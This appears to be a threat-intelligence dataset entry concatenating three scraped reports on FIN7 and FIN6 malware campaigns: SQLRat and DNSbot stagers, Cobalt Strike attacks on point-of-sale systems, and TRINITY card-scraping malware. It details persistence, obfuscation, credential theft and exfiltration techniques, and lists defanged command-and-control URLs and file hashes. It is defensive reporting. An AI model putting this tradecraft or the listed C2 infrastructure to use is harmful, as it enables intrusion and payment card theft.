TinyMet —an open source Meterpreter stager—but the actors have the option to store and execute any binary loaded into the table. https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 4 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 Image 5: Code responsible for downloading from the database. Files associated with the SQLRat campaigns were all SFX RAR files. The files were 32/64-bit versions of a custom-built TinyMet along with a recon.js file. The 32-bit file contained an XOR embedded .exe file. The file was decoded out using the following: https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 5 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 Image 6: Deobfuscate embedded “TiniMet,” a customized version of TinyMet. The result is a customized version of TinyMet. This version has limited usage; it does reverse TCP, XOR decodes the data retrieved for execution of the stager, and looks for TrendMicro processes. This file calls itself TiniMet: https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 6 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 Image 7: TiniMet looking for TrendMicro processes. Analysts also uncovered a “TinyPS” stager: After decoding out the blob, analysts found a PowerShell script. This script was similar to what was previously documented in the https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 7 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 Trustwave report “Operation Grand Mars: Defending Against Carbanak Cyber Attacks.” The script contained the same XOR key but does not achieve persistence. It is only intended to create the Meterpreter session. The following is the PowerShell version of TiniMet: Image 9: TinyPS PowerShell stager snippet. DNSbot Technical Details Analysts also uncovered subsequent campaigns associated with this panel. These campaigns were similar, but leveraged a document containing an embedded JavaScript-based DNSbot. The document contained the same MsgBox display, but this time there was a single file and task. The task name is similar to “Microsoft update service,” but the obfuscated JS file is dropped in %localappdata%\Storage: https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 8 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 Image 10: DNSBot drop location. Additionally, the same US SEC Unlock document service is displayed, though the Microsoft update service task is deleted and replaced with the DNSbot. Image 11: DNSbot task update. The JavaScript is heavily obfuscated. The first variable—a—is an array of obfuscated values. The second line contains a function to deobfuscate the values, while the call to that function is the second variable, b: https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 9 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 Image 12: DNSbot obfuscation. A deobfuscated version of the DNS script is: https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 10 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 Image 13: DNSbot deobfuscated. A second deobfuscated testing script also matched components of the JavaScript embedded in the ASTRA docs, demonstrating the script’s multiprotocol use. The domain stats25-google[.]com was included in a report released by FireEye earlier in the year: https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 11 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 Image 14: Script relation to other reporting. The ASTRA backend was installed on a Windows server with Microsoft SQL. The panel was written in PHP and managed the content in the tables. It functioned as a script management system. Mitigations https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 12 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 Image 15: ASTRA attack panel partially redacted. Image 16: FIN7 front company name. Image 17: The file types that were inserted, along with a table layout of the database with partial redaction. Flashpoint recommends watching for newly added Windows tasks, specifically those with a JScript switch. Also, monitor for attempts to delete the Microsoft update service. Flashpoint also recommends implementing host-based detections for new files in %appdata%\Roaming\Microsoft\Templates\ with a dot https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 13 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 extension, as well as implementing host-based detections for files in %appdata%\local\Storage\. Attachments and Downloads The indicators of compromise (IOCs) for ASTRA panel, SQLRat, and DNSbot are available for download here. https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 14 di 14"
fin6,cti-hal,130f3a6191df,G0037,"New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 Cybersecurity Blog Cybersecurity News, Threat Research, And More From The Team Spearheading The Evolution Of Endpoint Security New Global Cyber Attack on Point of Sale Systems Posted by Morphisec Labs on February 27, 2019 Post Share Share 0 This post was authored by Michael Gorelik and Alon Groisman. Subscribe to our blog Stay in the loop with industry insight, cyber security trends, and cyber attack information and company updates. First Name* Last Name* Email* https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 1 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 Email* Company* Subscribe Over the past 8-10 weeks, Morphisec has been tracking multiple sophisticated attacks targeting Point of Sale thin clients globally. More speciﬁcally, on the 6 of February we identiﬁed an extremely high number of prevention events stopping Cobalt Strike backdoor execution, with some of the attacks expressly targeting Point of Sale VMWare Horizon thin clients. th Based on the initial indicators, we identiﬁed FrameworkPOS scraping malware installed on some of the thin clients, after initializing PowerShell/WMI stages that downloaded and reﬂectively loaded Cobalt-Strike beacon with PowerShell extension directly into the memory. We found many indicators linking speciﬁcally to the FIN6 group (WMI/PowerShell, FrameworkPOS, lateral movement and privilege escalation), with the difference of moving from Metasploit to Cobalt-Strike). Some indicators are also tied to the EmpireMonkey group. At this point, we don’t have enough data for proper attribution. If successful, the Cobalt Strike beacon payload gives attackers full control over the infected system and the ability to move laterally to other systems, harvest user credentials, execute code Search Our Site Keyword... Recent Posts You’ve Got Mail: Critical Microsoft Outlook Vulnerability Executes as Email is Opened Howling at the Inbox: Sticky Werewolf's Latest Malicious Aviation Attacks Adaptive Cyber Resiliency Best Practices Evolving Cyber Resiliency: How Adaptive Exposure Management Strengthens CTEM Programs Threat Bulletin – New https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 2 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 and more, all while evading advanced EDR scanning techniques. Digging deeper into the notiﬁcation and the telemetry, we identiﬁed victims across the United States, Japan and India from the ﬁnance, insurance and healthcare (diagnostic image processing) sectors, as well as additional targets globally. Following additional retro-hunting on Virus Total, we identiﬁed multiple servers that were, and still are, delivering the Cobalt Strike beacon using the same delivery pattern and same C2 communication pattern. We have notiﬁed the customers and the legal authorities about the currently active C2 servers. Morphisec Labs is currently still analyzing the inﬁltration methods (unknown); due to this we will present only partial technical information in this report. However, we believe it important to publish even a partial analysis so that enterprises are aware of, and immediately block, any access to the URLs listed below. Technical information: Inﬁltration As stated in the introduction, the inﬁltration vector is yet to be determined, although after retro-hunting on VT and matching it to our known telemetry events, we believe that at least one vector is executed through HTA ﬁles that execute PowerShell scripts as part of an embedded VBScript. variant of IDAT Loader Introducing the Anti- Ransomware Assurance Suite: A Multi-Layered Guard Against Ransomware History of Ransomware: The Evolution of Attacks and Defense Mechanisms Preventing Ransomware and Advanced Endpoint Threats with Morphisec + Microsoft Defender for Endpoint Threat Bulletin – CVE-2024- 2883 Breaking Boundaries: Mispadu's Inﬁltration Beyond LATAM Posts by Tag Moving Target Defense (129) Cyber Security News (125) Morphisec Labs (114) Threat Research (67) Threat Post (64) See all https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 3 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 Script stager Additional hunting reveals additional scripts that lead to the same Cobalt Strike beacon. It is not known if the scripts below are part of a lateral movement or just additional examples of inﬁltration samples. However, at least some of them are executed through WMI which may indicate an intermediate stage. POWERSHELL JAVASCRIPT BAT https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 4 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 PowerShell Stager All the various scripts are decoded to the following PowerShell pattern: The script above decompresses an additional level of PowerShell stager (regular Gzip): https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 5 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 Clearly, the marked base64 encoded script represents the next stage shellcode that is either remotely injected into the existing 32 bit or into a newly created 32 bit PowerShell process (if the current PowerShell is 64bit). Some samples differentiate in the way the VirtualAlloc and CreateThread are declared. Shellcode Stager The injected shellcode is a regular Metasploit downloader shellcode that traverses the PEB, resolves the function names by the standard ROR 13 hash, and downloads the next stage shellcode directly into memory from the C2. The pattern of the C2 download request destination is generally URL:PORT/[a-zA-Z0-9]{4}. It executes InternetConnectA, InternetOpenA, HttpOpenRequestA, HttpSendRequestA for the purpose of downloading the next stage. https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 6 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 Cobalt Strike Beacon Morphisec observed 2 types of beacons during this campaign, the ﬁrst one is a regular direct reﬂective loaded Cobalt Strike DLL beacon, usually XOR encoded. The second type is a shellcode backdoor beacon with PowerShell and Mimikatz functionality. Persistency and FrameworkPOS In some cases, after executing the backdoors, the attackers install “WindowsHelpAssistant” task in the task scheduler. In turn, this, on login, uses rundll32.exe with System privileges to execute and export function “workerInstance” from a https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 7 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 downloaded binary DLL “Assistant32.dll”. We also observed similar command execution as part of the HKLM Run key. The “Assistant32.dll” is the FrameworkPOS scraper that shares similar TTPs to a previously seen FrameworkPOS used by FIN6. The malware XOR’s (xor 0xAA) the credit card information before exﬁltration through DNS tunneling. Conclusions These types of advanced attacks that utilize memory to evade detection solutions either by reﬂectively loading libraries, hollowing process memory or injecting code into new processes, are harder and harder to attribute due to the simple fact that more and more criminals are taking advantage of the strength of these evasion techniques and the weakness of runtime detection technologies to cope with such evasion. The attackers have the advantage of choosing where to execute their malicious code and when to execute it, while runtime detection solutions cannot constantly scan the memory to detect the attack precisely when it manifests without signiﬁcantly impacting the performance https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 8 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 of the process runtime. It is important to note that Morphisec prevents these types of attacks immediately, without any prior knowledge of the attack form or techniques. The forensic information used in this analysis was captured after the attack was already prevented. Artifacts Domains C2s STILL ACTIVE: hxxp://217.12.218[.]95:22222/c7Pr hxxp://89.105.194[.]236:443/Xaq2 hxxp://46.166.173[.]109:443/Qq9a hxxp://bbing.co[.]za:443/tXY7 hxxp://47.75.151[.]154:443/ZyBG hxxp://185.80.233[.]166:443/qPe6 INACTIVE: hxxp://5.39.219[.]15:8081/JVZb hxxp://45.247.22[.]27:4444/EzFB hxxp://standardcertiﬁcations[.]com:8080/cArF hxxp://34.245.88[.]113:9090/tNDV hxxp://2.72.0[.]200/9RyX hxxp://185.202.174[.]91:443 hxxp://192.81.223[.]204/rr3E hxxp://172.16.196[.]200/JSlT hxxp://37.139.21[.]20/Orb9 hxxp://185.135.157[.]138:8080/9Par hxxp://188.166.105[.]24/o9ZZ hxxp://185.202.174[.]84:443/c9Fz https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 9 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 hxxp://35.182.31[.]181:443/jquery-3.3.1.slim.min.js hxxp://209.126.106[.]228:443 (only 32 bit) hxxp://172.17.3[.]2/G9fv hxxp://104.237.131[.]29:443 hxxp://93.115.26[.]171:443 hxxp://188.166.105[.]24/cYj7 SCRIPT DOWNLOADERS: 0328fcc8229397c7bb4d0ccc958b09caa9a116b549cf59ae95b2d030ef70d54c 063060e5031ad4de170ea979e0a8e36c053904f5f4a33f147f9351328c465594 0ac9795a9eb6b374250523f29f55d07bea2c4c7077ab59c1fb38b38eca1f6f2a 0d8cd722c9cb741c68672612d9668aac59b3b116d11943fb4e010940272fe72f 143ca82d8ce9330d45078dcfcf3a75c8bff2d9f4a796729409dcd9d4a2914a5f 1d53bf1f98cab29509c9211e6dcf6d830ba602dd8886d1d9339c426a1ab4dbcf 1e3a4e51b9fe9d2fb94e040d3fcdb6a7874b035233ffc7ef779bd8ba01857097 20c4a40286b5fed63a322bdfc5b3fefdffb248423f2c1d3c586b4e207b7d8d06 21d9044a4314474b0ee50760902e4887a504708b588a3bf33f57417edba9ac9d 255eb59d84d7856bc857320e7e970e90808e7c9f2149cc29be6049ae164f965e 27c5d43786c826ee5072355c5e5aa16714873e389473e7569cdbf8c14a71aefc 31f55ed1989364263d9f150236baf73d73d5ab04c33b833038c983516d56718c 3df945c192636020101feba5fd2587f9bedd509ae093832e7c0bcad58e3082b1 4528b63bfe4ac3f5d757fdb4086f119bfd23972014ef751c10f8dae77e69ca8c 457248cf03d33c33484957c5e3449ff4530ba3f9387c09f835648e57498e9735 47fbbeee59236164e3a99d34c406ee36f1c6243d2e66f0019512d795de3fae1e 5151e0220dc73099dc340e5158fa1a046ca26dfd55c7c8d226a9e3e69872389b 5573a9e82526decf8bba7c594d919cadbb0473c33e926296772ad89c894a9ce6 57c49f5724ecfcce148577456c9b9166664709515bfa266c18b0729f6dadae31 https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 10 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 588a4ca6c560b7e3d8ed4cdfcd0c57846439d34fabf32635cda12fe17d2e9d8c 6176941029763c6d91d408f3d63f1006de97eba45cb891b6a55f538d299b8a8c 6a1be30c9854bf7f97ebd6fb2ef85e527279dbebd8f700980718febbf53f4d6a 6f4a257ffaa31402c4062b0c3f98bbdd0d083221ea071a6a6439b56753f9c3f6 88987cb359a26ca6676a7904fef1e360fa37e5bc6c8be7f131b504047ce7dfd7 8ad326cbbfb3486d584f5589353e23e83a8152e2eb75faa5851a09272a80c5d7 900c232af659de5a5c816c756d48459a7cb78ad45f95aa8b869f694eb37551ee 999a8125534fc18e25ced0e24228909b33ac2b88960716cd5b9dfbe6db2ddca7 a01f4bf64ef45ffaa2eee0e7eb9a8e10639cdf1551c9809fdfa5bf8262887912 a3fe01b478068e0215dbf16bcc70234afead415c89f791261158bed8ea42c48a a608307886cada313944636d60ca7c8f6b2ecd1d5071f51f99634d84a1412ad1 b44e573e2203d1e54e3c0cf8aafff15d9c9659be713710017698fe54589c1d5d b630986f6f261587d6ca4e36a81268c16840a1a0df1e960a023e10f866b1e6e5 bef5d3646353b43290a6e8f905f69e3c41e5a4f5c784d76a59b44592d79d0422 c018dc64321541f5a815a3688187f26436482c47702b67a6db9d0cba98506b68 c1d1d2db4ec357ce93bc220412a791444bcf6e4a69307a45532457531a60cfde c6f61bfbd11a723f24122ca618b66a77ec342e26d9423a2751fe7218306b7bc0 d6c41db2531b1aa5ac0a0473e6c3e5b55df47d6ef09756c3fc418583c9b418c1 deff2bb5bec2f6c7da3b5499764d695d8ad571ce1c3f0a3078bdf89aeaa9ad08 e24bf8cdb99d9404ed4272f980294957b842ee308eb2cd88ab053faf67ba90bf e468a98a2bec5408437d39aeb8e6c68b83b1c26c33ba3ffa8673104bc9e4c1f7 e777b733918ce04adfe6fe7961885fa9e5408fd2bb0dc97eeee4b5fee08cd77f f2cbf58594bb9cf670c16cd297e5b0d91568da5a50f92ea3c68ca046e5b25f61 f3a7af069a9ca248961038a0b30f7685ace1080d59449071477798e2164c1ffd f82f563970927bb4ca5d0c7df4db610b3076a2221761c262974ae7d92be73043 fb312d11d54480b6a4721fda5ede5b97165b0985e1408d206baed2d91838d5d4 https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 11 di 13 New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 876e33b143741d9403f7848aac7f47e04e48d92b083e646fe49628585e4e6b0d Products Product Overview Morphisec for Windows Endpoints Morphisec for Windows Servers & Workloads Morphisec for Linux Server Protection Morphisec Vulnerability Visibility & Prioritization Incident Response Services About Moving Target Defense Solutions By Industry Solutions by Use Case Banking & Finance Hedge Funds Healthcare Technology Manufacturing Legal K-12 Education SMB Microsoft Defender for Endpoint Microsoft Defender AV Virtual Desktop Protection Ransomware Protection Supply Chain Attack Protection Company About Us News & Events Careers Blog Support Partners Contact Us Privacy & Legal Contact Sales Cloud Workload Protection Inquire via Azure Remote Employee Security Virtual Patching & Compliance Browser Attack Protection https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 12 di 13 © 2023 Morphisec Ltd. | All rights reserved New Global Cyber Attack on Point of Sale Systems 17/06/24, 11:08 https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems Pagina 13 di 13"
fin6,cti-hal,7dd04504c8a6,G0037,"F I R E E Y E T H R E A T I N T E L L I G E N C E FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 S P E C I A L R E P O R T / A P R I L 2 0 1 6 SSFCPANFSNAMEFSPrimary Account No. (19 digits max.)Name (26 alphanumeric characters max.ADDITIONAL DATAESDISCRETIONARY DATALRCExpiration Date (YY/MM) 4Service Code 3No. of CharactersNo. of Characters CONTENTS Follow the Money: Dissecting the Operations of the Cyber Crime Group FIN6 3 FIN6 Gaining Access - Indiscriminate or Intentional? FIN6 - Getting the Job Done Underground Card Shops - Following the Money Conclusion 4 5 6 9 11 SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 2 FOLLOW THE MONEY: D I S S E C TI N G T H E O P E R ATI O N S O F T H E C Y B E R C R I M E G R O U P F I N 6 Reports on payment card intrusions and theft are often fragmentary. The focus is on various pieces of the attack and less about capturing the end-to-end cycle of compromise, data theft, illicit sale and use. The full scope of attacker activity traditionally occurs beyond the view of any one group of investigators. Incident response teams may have visibility into the technical aspects of the breach itself, while cyber crime researchers monitor the movement and sale of stolen data in the criminal underground. FireEye Threat Intelligence and iSIGHT Partners recently combined our research to illuminate the activities of one particular threat group: FIN6. This combined insight has provided unique and extensive visibility into FIN6’s operations, from initial intrusion to the methods used to navigate the victims’ networks to the sale of the stolen payment card data in an underground marketplace. In this report, we describe FIN6’s activities and tactics, techniques and procedures (TTPs), and provide a glimpse into the criminal ecosystem that supports the “payoff” for their operations. SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 3 FIN6 FIN6 is a cyber criminal group intent on stealing payment card data for monetization. In 2015, FireEye Threat Intelligence supported several Mandiant Consulting investigations in the hospitality and retail sectors where FIN6 actors had aggressively targeted and compromised point- of-sale (POS) systems, making off with millions of payment card numbers. Through iSIGHT, we learned that the payment card numbers stolen by FIN6 were sold on a “card shop” — an underground criminal marketplace used to sell or exchange payment card data. Figure 1 illustrates what we believe to be FIN6’s typical operational methodology. FIREEYE INTELLIGENCE TRACKS targeted Financial threats (known as “FIN” groups) capable of using a wide range of tools and tactics during their computer network intrusions. These groups employ a high level of planning, organization and task management to accomplish their goals. The threat actors generally target a particular demographic or type of organization, and their goal is financial gain from the data they steal. They may profit through direct sale of stolen data (such as payment cards or personally identifiable information), unauthorized transfer of funds (such as with stolen bank account or bank routing credentials); or insider trading (based on the theft of non- public business information). FIGURE 1: FIN6 OPERATIONAL METHODOLOGY P O S M A LWA R E Email phishing credential theft Lateral movement on the network Exfiltration payment card data to the cyber criminal underground G R A B N E W M A LWA R E C A R D S H O P I N D I S C R I M I N AT E TA R G E T E D C A S H O U T SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 4 GRABNEW, ALSO KNOWN AS NEVERQUEST AND VAWTRAK, emerged around 2013 and since then has been consistently and indiscriminately spread through massive spam campaigns. We typically differentiate between threat actors who indiscriminately distribute malware and threat actors who use malware selectively. GRABNEW itself is a credential-stealing backdoor with form-grabbing capabilities and the ability to inject code into specific web pages to, for example, mimic a valid login prompt for a financial institution to facilitate banking fraud. In some cases, the presence of GRABNEW malware has overlapped with the spread of POS malware such as PoSeidon, a variant of the Backoff POS malware. INDISCRIMINATE OR INTENTIONAL? GAININGACCESS It’s not entirely clear how FIN6 initially compromises victims. In Mandiant’s investigations, FIN6 already possessed valid credentials to each victim network and used those credentials to initiate further intrusion activity.1 In one case, GRABNEW malware was found on a victim computer that FIN6 later used in its operations. We suspect that the computer was originally compromised with GRABNEW by a separate threat actor, who used GRABNEW to capture valid user credentials. FIN6 may have obtained those credentials (through purchase or trade) and used them for its operations. FIN6’s use of GRABNEW, or credentials collected by GRABNEW, is not altogether surprising and possibly points to a cyber crime support ecosystem that opens doors to threat actors capable of lateral movement and more damaging activities. Previously, we observed another FIN group — FIN2 — leverage several existing Citadel compromises to deploy their custom tools and expand within a network to compromise payment card systems. Likewise, Proofpoint recently observed GRABNEW variants leading to downloads of POS malware known as AbaddonPOS. 1 When investigating an intrusion, it may be challenging to determine the initial method of compromise — the means through which a threat group first gained access to a victim network. While in some cases evidence may point to a spear-phishing attack or exploit execution, in other cases little to no forensic evidence of the original compromise remains. SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 5 After locating POS systems within the target’s environment, FIN6 deployed POS malware that we call TRINITY. GETTING THE JOB DONE FIN6 All threat groups generally follow a broad operational framework known as the Attack Lifecycle. While the phases of the Attack Lifecycle — from initial compromise to privilege escalation to maintaining presence and completing the mission — are remarkably consistent, the specific TTPs used vary widely based on a group’s skills, motivations and ultimate goals. After gaining access with valid credentials, we observed FIN6 leveraging components of the Metasploit Framework to establish their foothoold. For example, in one case, FIN6 used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener that would execute shellcode received over a specific port. Similarly, FIN6 used at least two downloaders called HARDTACK and SHIPBREAD (apparent variations on Metasploit payloads) to establish backdoor access to the compromised environment. Both of these tools are configured to connect to remote command and control (CnC) servers and download and execute shellcode. FIN6 generally used either registry run keys or Windows scheduled tasks in order to establish persistence for these tools. Once their accesses were established with preferred backdoors, FIN6 used additional public utilities such as Windows Credentials Editor for privilege escalation and credential harvesting. Additional privilege escalation tools exploited Microsoft Windows vulnerabilities in an attempt to compromise privileged account credentials on various hosts. The tools targeted CVE-2013-3660, CVE-2011-2005 and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.2 Continuing their use of Metasploit-related tools, FIN6 also used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the Active Directory database (ntds.dit). Access to this file would allow them to extract password hashes from the file and crack them offline. 2 These vulnerabilities have all been patched by Microsoft; Windows systems with up-to-date software and security patches should not be exploitable. SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 6 ADDITIONAL DATAESDISCRETIONARY DATALRCExpiration Date (YY/MM) 4Service Code 3No. of CharactersNo. of Characters In addition to collecting credentials, FIN6 used publicly available tools to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers and NetBIOS. In particular, during the reconnaissance phase they gathered information on systems running SQL instances, dumping schemas for multiple databases and SQL user accounts. Specific tools used by FIN6 included Microsoft’s built-in SQL querying tool (osql.exe), Query Express (a free, portable graphical SQL client capable of connecting to Microsoft SQL and Oracle databases) and AdFind, a free command-line tool for querying Active Directory. Over the course of one day, for example, the group targeted more than 900 SQL servers to dump reconnaissance information to support further operations. Capitalizing on the acquired reconnaissance data, FIN6 began lateral movement using credentials stolen from various systems on which they gathered usernames and password hashes. They likely cracked these hashes outside of the target’s network before using multiple sets of domain admin credentials in combination with remote command execution tools such as PsExec and Remote Command Executor (RemCom) throughout the rest of the lateral movement phase. To maintain presence and support interactive access in the environment, FIN6 leveraged the publicly available Plink command-line utility (part of the PuTTY SSH and Telnet suite) to create SSH tunnels to CnC servers under their control. As shown in Figure 2, they used these SSH tunnels to route Remote Desktop Protocol (RDP) traffic and allow for interactive RDP sessions with systems in the target network. After locating POS systems within the target’s environment, FIN6 deployed POS malware that we call TRINITY (also known as FrameworkPOS), with Scheduled Tasks being used for persistence. TRINITY runs continuously and targets system processes not listed in its accompanying process blacklist, seeking data that matches payment card track data. Once the malware identifies track data, it copies and encodes it to a local file in a subdirectory of the c:\windows\ directory while attempting to conceal these files with .dll or .chm extensions. In one particular case — and as an example of scale — FIN6 compromised and deployed TRINITY on around 2,000 systems, resulting in millions of exposed cards. TRINITY IS POS MALWARE THAT ATTEMPTS TO LOCATE AND STEAL PAYMENT CARD DATA FROM MEMORY. The malware first creates mutexes named m_number3 and MuTex-Check and exits if either already exists. The malware then continuously iterates over the current process listing and examines the memory space of each process. Processes with module names less than five characters are skipped, along with some specific process names that are unlikely to contain payment card information. TRINITY logs captured data to disk, typically to a file in %WINDIR%\temp or %WINDIR%\help. The malware encodes the data with a simple substitution cipher and single-byte XOR using the OxAA key. Finally, to move the stolen payment card data out of the environment, FIN6 used a script to systematically iterate through a list of compromised POS systems, copying the harvested track data files to a numbered “log” file before removing the original data files. They then compressed the log files into a ZIP archive and moved the archive through the environment to an intermediary system and then to a staging system. From the staging system, they then copied the stolen data to external CnC servers under their control using the FTP command line utility. In another case, FIN6 used an alternative extraction method to upload payment card data to a public file sharing service. SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 7 F I G U R E 2 : N E T W O R K D I AG R A M S H OW I N G F I N 6 P L I N K S S H T U N N E L U S E D T O R O U T E R D P T R A F F I C T O V I C T I M C O M P U T E R S AT TAC K E R C n C S E R V E R P L I N K T U N N E L R D P T U N N E L AT TAC K E R C n C S E R V E R AT TAC K E R C n C S E R V E R V I C T I M 1 H O S T R D P V I C T I M 2 V I C T I M 3 V I C T I M 4 SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 8 Our analysis of the data sold through this underground vendor indicates that FIN6’s compromises are highly profitable to the actors involved, potentially resulting in extensive fraud losses. UNDERGROUND CARD SHOPS FOLLOWING THE MONEY Using iSIGHT Partners’ collected intelligence, we discovered that the stolen payment card data from these intrusions were sold in an underground card shop. This particular shop is advertised on multiple underground cyber crime forums and has offered diverse criminals access to millions of stolen payment cards on a regular basis. This closes the loop on the “lifecycle” of cyber criminal activity and exemplifies one of the final stages of cyber crime actors monetizing their stolen data. We have identified stolen data from several of FIN6’s victims being sold by this vendor as far back as 2014. This connection means that data stolen by FIN6 has almost certainly ended up in the hands of fraud operators across the world, as they buy and exploit payment cards from the underground shop. In each case, the stolen data began appearing in the shop within six months of the FIN6 breach. While the amount of data sold through the shop varies by breach, in some cases more than 10 million cards associated with a specific FIN6-linked breach have been identified on the shop. After being posted, much of the stolen card data is quickly purchased for exploitation. Along with the data we have linked to FIN6, this underground shop has sold data from millions of other cards, which may be linked to breaches perpetrated by other threat actors. SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 9 UNDERGROUND COMMUNITIES DEALING IN STOLEN CARD DATA EXIST ACROSS THE world and are a major facilitator of money laundering operations. A large number of these communities take the form of illicit e-commerce sites called “card shops” or “dump shops” (criminals refer to stolen card-present transaction data as “dumps”). These shops allow their clientele to use a web-based platform to sort through data on thousands or millions of payment cards and purchase exactly the types they want based on their money laundering capabilities. These data are then added to the client’s cart for checkout, similar to a legitimate website. Subsequently, customers use the card information they have purchased for many different money laundering schemes, such as buying and reselling gift cards or electronics. Our analysis of the data sold through this underground vendor indicates that FIN6’s compromises are highly profitable to the actors involved, potentially resulting in extensive fraud losses. For instance, in one FIN6-linked breach the vendor was advertising nearly than 20 million cards. These cards were predominantly from the United States and selling for an average of $21. So the total return for the shop — if all the data was sold at full price — could have been about $400 million. In reality, the shop would typically only make a fraction of this figure since not all the data would be sold (laundering stolen cards is typically much harder than stealing them), buyers want the newest data they can get (data that has been on the shop for a while loses its value) and the shop offers discounts based on various criteria. Still, a fraction of $400 million is a significant sum. In turn, cyber criminals purchasing the data would expect to make more than they paid for the cards by conducting fraudulent transactions using those cards. Not all of the data sold on this particular card shop has been tied to an identified compromise or specific cyber criminal group. Additionally, as is often the case with prominent cyber criminal vendors, it is not yet clear how the operators of the underground site are linked to the actors who steal the data the shop sells. The vendor has sold large amounts of card data with varied characteristics, so it is possible the shop operators maintain relationships with more than one data provider. FIN6 members could include some of the operators behind this shop; alternately, FIN6 could be selling stolen data to the operators of this site. SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 10 CONCLUSION Good threat intelligence comes from a combination of factors. It requires visibility into the threat landscape, including both a broad view (the ability to identify activity across a range of countries, industries and organizations) and a deep view (the ability to gather detailed information about how threat actors operate). It also requires skilled analysts who are able to review, fuse and understand the available data. In this case, the combined intelligence from FireEye, Mandiant and iSIGHT intelligence teams was able to not only identify malicious activity aimed at stealing payment card data, but also provide a detailed window into that activity from compromise through monetization of the stolen data. The story of FIN6 shows how real-world threat actors operate, providing a glimpse not only into the technical details of the compromise, but also into the human factor as well; namely, the interactions between different criminals or criminal groups, and how it is not just data being bartered or sold in the underground, but also tools, credentials and access. SPECIAL REPORT / FOLLOW THE MONEY: DISSECTING THE OPERATIONS OF THE CYBER CRIME GROUP FIN6 11 To download this or other FireEye Threat Intelligence reports, visit: www.fireeye.com/reports.html FireEye, Inc. 1440 McCarthy Blvd. Milpitas, CA 95035 408.321.6300 / 877.FIREEYE (347.3393) / info@FireEye.com www.FireEye.com © 2016 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc. All other brands, products, or service names are or may be trademarks or service marks of their respective owners. 